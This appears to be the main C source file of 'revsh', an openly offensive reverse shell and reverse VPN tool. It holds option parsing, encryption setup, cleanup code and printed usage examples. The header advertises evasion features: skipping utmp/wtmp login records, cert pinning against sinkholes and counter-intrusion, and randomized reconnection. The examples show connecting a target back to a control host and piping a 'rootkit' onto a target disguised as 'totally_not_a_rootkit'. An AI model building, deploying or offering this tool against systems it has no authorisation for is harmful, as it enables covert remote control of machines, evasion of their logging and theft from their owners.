
/***********************************************************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support!
 *	More than just a reverse shell, now we're a reverse VPN!!!
 *
 *
 * 2013-07-17: Original release.
 * 2014-08-22: Complete overhaul w/SSL support.
 * 2015-01-16: YACO (Yet another complete overhaul.) Added the internal messaging interface.
 * 2016-08-27: YACO (Yet another complete overhaul.) Added proxies, tun/tap support, and cleaned up the broker() loop.
 *
 *
 * The revsh binary is intended to be used both on the local control host as well as the remote target host. It is
 * designed to establish a remote shell with terminal support as well as a reverse vpn for tunneling.
 *
 *
 * Features:
 *		* Reverse Shell.
 *		* Bind Shell.
 *		* Terminal support.
 *		* Unicode support.
 *		* Handle window resize events.
 *		* Circumvent utmp / wtmp. (No login recorded.)
 *		* Process rc file commands upon login.
 *		* OpenSSL encryption with key based authentication baked into the binary.
 *		* Anonymous Diffie-Hellman encryption for use without key management.
 *		* Ephemeral Diffie-Hellman encryption for use with key managment. (Now with more Perfect Forward Secrecy!)
 *		* Cert pinning for protection against sinkholes and mitm counter-intrusion.
 *		* Connection timeout for remote process self-termination.
 *		* Randomized retry timers for non-predictable auto-reconnection.
 *		* Non-interactive mode for transfering files.
 *		* Proxy support: point-to-point, socks4, socks4a, socks5
 *			(Note: Only the "TCP Connect" subset of the socks protocol is supported.)
 *		* TUN / TAP support for forwarding raw IP packets / Ethernet frames.
 *
 **********************************************************************************************************************/



/* XXX

- Add ~ escape support:
	~.	Disconnect.
	~#	List forwarded connections.
	  		Add bytes_read and bytes_written to connection nodes as unsigned longs. Report with ~#.
	~?	Display a list of escape characters.


- Reverse io->controller to io->target.

- Test all the switches.
- Make a man page.
- Use daily til Toorcon.

XXX */

#include "common.h"



char *GLOBAL_calling_card = CALLING_CARD;

volatile sig_atomic_t sig_found = 0;


/***********************************************************************************************************************
 *
 * usage()
 *
 * Input: The return code.
 * Output: None. (We will exit directly from this function.)
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 **********************************************************************************************************************/
void usage(int ret_code){

	FILE *out_stream = stdout;

	if(ret_code){
		out_stream = stderr;
	}

	fprintf(out_stream, "\nControl:\t%s -c [CONTROL_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS:PORT]\n", program_invocation_short_name);
	fprintf(out_stream, "Target:\t\t%s     [TARGET_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS:PORT]\n", program_invocation_short_name);
	fprintf(out_stream, "\nCONTROL_OPTIONS:\n");
	fprintf(out_stream, "\t-c\t\tRun in \"command and control\" mode.\t\t(Default is target mode.)\n");
#ifndef GENERIC_BUILD
	fprintf(out_stream, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is Ephemeral Diffie-Hellman.)\n");
# ifdef OPENSSL
	fprintf(out_stream, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s\".)\n", KEYS_DIR);
# endif /* OPENSSL */
#endif
	fprintf(out_stream, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s\".)\n", RC_FILE);
	fprintf(out_stream, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
#ifdef LOG_FILE
	fprintf(out_stream, "\t-F LOG_FILE\tLog general use and errors to LOG_FILE.\t\t(Default is \"%s\".)\n", LOG_FILE);
#else
	fprintf(out_stream, "\t-F LOG_FILE\tLog general use and errors to LOG_FILE.\t\t(No default set.)\n");
#endif

	fprintf(out_stream, "\nTARGET_OPTIONS:\n");
	fprintf(out_stream, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
	fprintf(out_stream, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
	fprintf(out_stream, "\t-k\t\tRun in keep-alive mode.\n\t\t\tTarget will never seppuku.\n");

	fprintf(out_stream, "\nMUTUAL_OPTIONS:\n");
	fprintf(out_stream, "\t-L [LHOST:]LPORT:RHOST:RPORT\n");
	fprintf(out_stream, "\t\t\tLocal forward connections from the local\n\t\t\tlistener at LHOST:LPORT to RHOST:RPORT.\n"); 
	fprintf(out_stream, "\t-D [LHOST:]LPORT\n");
	fprintf(out_stream, "\t\t\tDynamic forward connections from the local\n\t\t\tlistener at LHOST:LPORT.\t\t\t(Socks 4, 4a, and 5. TCP connect only.)\n");
	fprintf(out_stream, "\t-x\t\tDisable the default tun device.\n");
	fprintf(out_stream, "\t-y\t\tDisable the default tap device.\n");
	fprintf(out_stream, "\t-z\t\tDisable the default proxy listener.\t\t(Default listener on port %s)\n", SOCKS_LISTENER);
	fprintf(out_stream, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
	fprintf(out_stream, "\t\t\tThe -b flag must be invoked on both ends.\n");
	fprintf(out_stream, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
	fprintf(out_stream, "\t-v\t\tVerbose. -vv and -vvv increase verbosity.\n");
	fprintf(out_stream, "\t-h\t\tPrint this help.\n");
	fprintf(out_stream, "\t-e\t\tPrint out some usage examples.\n");

	fprintf(out_stream, "\n\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);

#ifdef GENERIC_BUILD
	fprintf(out_stream, "\n\tThis is the GENERIC_BUILD of revsh, which defaults to Anonymous Diffie-Hellman encryption.\n");
	fprintf(out_stream, "\tIn order to enable Ephemeral Diffie-Hellman (with Perfect Forward Secrecy) you will need to\n");
	fprintf(out_stream, "\tbuild your own copy from source and manage your own keys.\n");
	fprintf(out_stream, "\tThe source is available at: https://github.com/emptymonkey/revsh\n");
#endif

	fprintf(out_stream, "\n\n");

	exit(ret_code);
}


/***********************************************************************************************************************
 *
 * examples()
 *
 * Input: The return code.
 * Output: None. (We will exit directly from this function.)
 *
 * Purpose: Give the user some examples upon request.
 *
 **********************************************************************************************************************/
void examples(int ret_code){

	FILE *out_stream = stdout;

	if(ret_code){
		out_stream = stderr;
	}

	fprintf(out_stream, "\n%s usage examples for:\n", program_invocation_short_name);
	fprintf(out_stream, "\tcontrol host: 192.168.0.42\n");
	fprintf(out_stream, "\ttarget host:  192.168.0.66\n");

	fprintf(out_stream, "\nInteractive example:\n");
	fprintf(out_stream, "\tcontrol:\trevsh -c 192.168.0.42:443\n");
	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42:443\n");

	fprintf(out_stream, "\nInteractive example with ADDRESS defined as 192.168.0.42:443 in config.h:\n");
	fprintf(out_stream, "\tcontrol:\trevsh -c\n");
	fprintf(out_stream, "\ttarget:\t\trevsh\n");

	fprintf(out_stream, "\nBindshell example:\n");
	fprintf(out_stream, "\ttarget:\t\trevsh -b 192.168.0.66:443\n");
	fprintf(out_stream, "\tcontrol:\trevsh -c -b 192.168.0.66:443\n");

	fprintf(out_stream, "\nNon-interactive file transfer example:\n");
	fprintf(out_stream, "\tcontrol:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");

	fprintf(out_stream, "\n\n");

	exit(ret_code);
}


/***********************************************************************************************************************
 *
 * main()
 *
 * Inputs: The usual argument count followed by the argument vector.
 * Outputs: 0 on success. -1 on error.
 *
 * Purpose: main() parses the configuration and calls the appropriate conductor function.
 *
 **********************************************************************************************************************/
int main(int argc, char **argv){

	int retval;
	int opt;
	char *tmp_ptr;

	struct proxy_request_node *tmp_proxy_ptr = NULL;
	struct proxy_request_node *cur_proxy_ptr = NULL;

	struct config_helper *config;

	char *retry_string = RETRY;

	unsigned int seed;
	int tmp_fd;

  wordexp_t log_file_exp;


	/*
	 * Basic initialization.
	 */

	/* We will not print errors here, as verbose status has not yet been set. */
	if((io = (struct io_helper *) calloc(1, sizeof(struct io_helper))) == NULL){
		report_error("main(): calloc(1, %d): %s", (int) sizeof(struct io_helper), strerror(errno));
		return(-1);
	}

	if((config = (struct config_helper *) calloc(1, sizeof(struct config_helper))) == NULL){
		report_error("main(): calloc(1, %d): %s", (int) sizeof(struct config_helper), strerror(errno));
		return(-1);
	}

	/* message is used throughout the code as a shorthand for io->message. */
	message = &io->message;

	/* Set defaults. */
	io->local_in_fd = fileno(stdin);
	io->local_out_fd = fileno(stdout);
	io->target = 1;
	io->eof = 0;
	io->child_sid = 0;
	io->proxy_head = NULL;
	io->proxy_tail = NULL;

	config->interactive = 1;
	config->shell = NULL;
	config->rc_file = RC_FILE;
	config->keys_dir = KEYS_DIR;
	config->bindshell = 0;
	config->timeout = TIMEOUT;
	config->keepalive = 0;
	config->nop = 0;

	config->tun = 1;
	config->tap = 1;
	config->socks = SOCKS_LISTENER;

#ifdef NOP
	config->nop = 1;
#endif

	config->log_file = NULL;
#ifdef LOG_FILE
	config->log_file = LOG_FILE;
#endif

#ifdef OPENSSL
	io->fingerprint_type = NULL;
	config->cipher_list = NULL;
#	ifdef GENERIC_BUILD
	config->encryption = ADH;
#	else
	config->encryption = EDH;
#	endif
#endif /* OPENSSL */

	verbose = 0;

	/*  Normally I would use the Gnu version. However, this tool needs to be more portable. */
	/*  Keeping the naming scheme, but setting it up myself. */
	if((program_invocation_short_name = strrchr(argv[0], '/'))){
		program_invocation_short_name++;
	}else{
		program_invocation_short_name = argv[0];
	}

	/* Grab the configuration from the command line. */
	while((opt = getopt(argc, argv, "hepbkalcxyzs:d:f:L:R:D:r:F:t:nv")) != -1){
		switch(opt){

			case 'h':
				usage(0);
				break;

			case 'e':
				examples(0);
				break;

			/*  The plaintext case is a debugging feature which should be difficult to use. */
			/*  You will need to pass the -p switch from both ends in order for it to work. */
			/*  This is provided for debugging purposes only. */
#ifdef OPENSSL
			case 'p':
				config->encryption = PLAINTEXT;
				break;

			case 'a':
				config->encryption = ADH;
				break;

			case 'd':
				config->keys_dir = optarg;
				break;
#endif /* OPENSSL */

				/*  bindshell */
			case 'b':
				config->bindshell = 1;
				break;

			case 'k':
				config->keepalive = 1;
				break;

			case 'l':
			case 'c':
				io->target = 0;
				break;

			case 'x':
				config->tun = 0;
				break;

			case 'y':
				config->tap = 0;
				break;

			case 'z':
				config->socks = NULL;
				break;

			case 's':
				config->shell = optarg;
				break;

			case 'f':
				config->rc_file = optarg;
				break;

			case 'L':
			case 'D':
				if((tmp_proxy_ptr = (struct proxy_request_node *) calloc(1, sizeof(struct proxy_request_node))) == NULL){
					report_error("main(): calloc(1, %d): %s", (int) sizeof(struct proxy_node), strerror(errno));
					return(-1);
				}

				if(!cur_proxy_ptr){
					cur_proxy_ptr = tmp_proxy_ptr;
					config->proxy_request_head = cur_proxy_ptr;
				}else{
					cur_proxy_ptr->next = tmp_proxy_ptr;
					cur_proxy_ptr = tmp_proxy_ptr;
				}
				cur_proxy_ptr->request_string = optarg;

				cur_proxy_ptr->type = PROXY_STATIC;
				if(opt == 'D'){
					cur_proxy_ptr->type = PROXY_DYNAMIC;
				}
				break;
			
			case 'r':
				retry_string = optarg;
				break;

			case 'F':
				config->log_file = optarg;
				break;

			case 't':
				errno = 0;
				config->timeout = strtol(optarg, NULL, 10);
				break;

			case 'n':
				config->interactive = 0;
				break;

			case 'v':
				verbose++;
				break;

			default:
				usage(-1);
		}
	}


	/* Check for bindshell mode from name. */
	tmp_ptr = strrchr(argv[0], '/');	
	if(!tmp_ptr){
		tmp_ptr = argv[0];
	}else{
		tmp_ptr++;
	}

	if(!strncmp(tmp_ptr, "bindsh", 6)){
		config->bindshell = 1;
	}

	if(config->keepalive){
		config->timeout = 0;
	}

	/* Grab the ip address. */
	if((argc - optind) == 1){
		config->ip_addr = argv[optind];
	}else if((argc - optind) == 0){
		config->ip_addr = ADDRESS;
	}else{
		usage(-1);
	}

	if(!io->target){
		/* Before anything else, let's try and get the log file opened. */
		if(wordexp(config->log_file, &log_file_exp, 0)){
			report_error("main(): wordexp(%s, %lx, 0): %s", config->log_file, (unsigned long)  &log_file_exp, strerror(errno));
			return(-1);
		}

		if(log_file_exp.we_wordc != 1){
			report_error("main(): Invalid path: %s", config->log_file);
			return(-1);
		}

		if(config->log_file){
			if((io->log_stream = fopen(log_file_exp.we_wordv[0], "a")) == NULL){
				report_error("main(): fopen(\"%s\", \"a\"): %s", log_file_exp.we_wordv[0], strerror(errno));
				return(-1);
			}
		}
	}

	/* Grab some entropy and seed rand(). */
	if((tmp_fd = open("/dev/random", O_RDONLY)) == -1){
		report_error("main(): open(\"/dev/random\", O_RDONLY): %s", strerror(errno));
		return(-1);
	}

	if((retval = read(tmp_fd, &seed, sizeof(seed))) != sizeof(seed)){
		report_error("main(): read(%d, %lx, %d): Unable to fill seed!", tmp_fd, (unsigned long) &seed, (int) sizeof(seed));
		return(-1);
	}

	close(tmp_fd);

	srand(seed);

	/*  The joy of a struct with pointers to functions. We only call "io->remote_read()" and the */
	/*  appropriate crypto / no crypto version is called on the backend. */
	io->remote_read = &remote_read_plaintext;
	io->remote_write = &remote_write_plaintext;

#ifdef OPENSSL
	if(config->encryption){
		io->remote_read = &remote_read_encrypted;
		io->remote_write = &remote_write_encrypted;
		io->fingerprint_type = EVP_sha1();

		switch(config->encryption){

			case ADH:
				config->cipher_list = ADH_CIPHER;
				break;

			case EDH:
				config->cipher_list = CONTROLLER_CIPHER;
				break;
		}
	}

	SSL_library_init();
	SSL_load_error_strings();
#endif /* OPENSSL */

	pagesize = sysconf(_SC_PAGESIZE);

	/*  Prepare the retry timer values. */
	errno = 0;
	config->retry_start = strtol(retry_string, &tmp_ptr, 10);
	if(errno){
		report_error("main(): strtol(%s, %lx, 10): %s", retry_string, (unsigned long) &tmp_ptr, strerror(errno));
		return(-1);
	}

	if(*tmp_ptr != '\0'){
		tmp_ptr++;
	}

	errno = 0;
	config->retry_stop = strtol(tmp_ptr, NULL, 10);
	if(errno){
		report_error("main(): strtol(%s, NULL, 10): %s", tmp_ptr, strerror(errno));
		return(-1);
	}

	
	/* Call the appropriate conductor. */
	if(!io->target){
		do{
			// If this is set, we've run once already. Let's clean up the io struct.
			if(io->init_complete){
				clean_io(config);
			}
			retval = do_control(config);
#ifdef OPENSSL
			SSL_shutdown(io->ssl);
#endif
		} while(retval != -1 && config->keepalive);
	}else{
		do{
			if(io->init_complete){
				clean_io(config);
			}
			retval = do_target(config);
#ifdef OPENSSL
			SSL_shutdown(io->ssl);
#endif
		} while(retval != -1 && config->keepalive);
	}

	return(retval);
}



/***********************************************************************************************************************
 *
 * clean_io()
 *
 * Input: None.
 * Output: None. 
 *
 * Purpose: In keepalive mode, we can't rely on the exit to handle cleanup. Since we may loop forever, let's clean up
 *   the io struct before reentering the appropriate conductor.
 *
 **********************************************************************************************************************/
void clean_io(struct config_helper *config){

  struct proxy_node *proxy_ptr;
  struct message_helper *message_ptr;

	io->child_sid = 0;

	if(io->target){
		close(io->local_in_fd);
		io->local_in_fd = 0;
		io->local_out_fd = 0;
	}
	close(io->remote_fd);

	io->interactive = 0;

	if(io->tty_winsize){
		free(io->tty_winsize);
		io->tty_winsize = NULL;
	}

	io->message_data_size = 0;

	if(io->message.data){
		free(io->message.data);
	}
	memset(&(io->message), 0, sizeof(struct message_helper));

	io->eof = 0;

	io->init_complete = 0;

	while(io->tty_write_head){
		message_ptr = io->tty_write_head;
		io->tty_write_head = message_ptr->next;

		message_helper_destroy(message_ptr);
	}

#ifdef OPENSSL
	if(config->encryption){

		if(io->ssl){
			SSL_free(io->ssl);
			io->ssl = NULL;
		}

		if(io->dh){
			DH_free(io->dh);
			io->dh = NULL;
		}

		if(io->ctx){
			SSL_CTX_free(io->ctx);
			io->ctx = NULL;
		}
	}
#else
	// nop reference to quiet compiler warnings in the compat build case.
	config->nop += 0;
#endif 

	while(io->proxy_head){
		proxy_ptr = io->proxy_head;
		io->proxy_head = proxy_ptr->next;

		close(proxy_ptr->fd);
		if(proxy_ptr->mem_ptr){
			free(proxy_ptr->mem_ptr);
		}
		free(proxy_ptr);
	}
	io->proxy_tail = NULL;

	while(io->connection_head){
		connection_node_delete(io->connection_head);
	}

	io->fd_count = 0;
}


/* 
	 The man page for POSIX_OPENPT(3) states that for code that runs on older systems, you can define this yourself
	 easily.
 */
#ifndef FREEBSD
int posix_openpt(int flags){
	return open("/dev/ptmx", flags);
}
#endif /* FREEBSD */
